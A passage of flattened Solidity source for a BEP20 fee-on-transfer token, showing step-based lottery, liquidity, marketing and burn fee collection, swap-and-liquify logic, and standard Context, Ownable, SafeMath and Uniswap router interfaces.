            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_2_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_2_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_2_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_2_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_2_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_2_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_2_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_2_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_2_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_3(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_3_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_3_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_3_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_3_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_3_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_3_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_3_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_3_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_3_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_3_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_3_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_3_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_3_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_3_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_3_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_3_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_3_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_4(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_4_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_4_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_4_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_4_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_4_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_4_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_4_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_4_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_4_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_4_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_4_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_4_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_4_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_4_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_4_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_4_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_4_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }

    function swapTokensForBnb(uint256 amount, address ethRecipient) private {
        
        //@dev Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), amount);

        //@dev Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of ETH
            path,
            ethRecipient,
            block.timestamp
        );
        
        emit SwapedTokenForEth(amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }

    function swapAndLiquify(uint256 amount) private {
        // split the contract balance into halves
        uint256 half = amount.div(2);
        uint256 otherHalf = amount.sub(half);

        // capture the contract's current BNB balance.
        // this is so that we can capture exactly the amount of BNB that the
        // swap creates, and not make the liquidity event include any BNB that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for BNB
        swapTokensForBnb(half, address(this));

        // how much BNB did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IBEP20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IContract {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Pair {
    function sync() external;
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./IUniswapV2Router01.sol";

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
      address token,
      uint liquidity,
      uint amountTokenMin,
      uint amountETHMin,
      address to,
      uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/OpenZeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}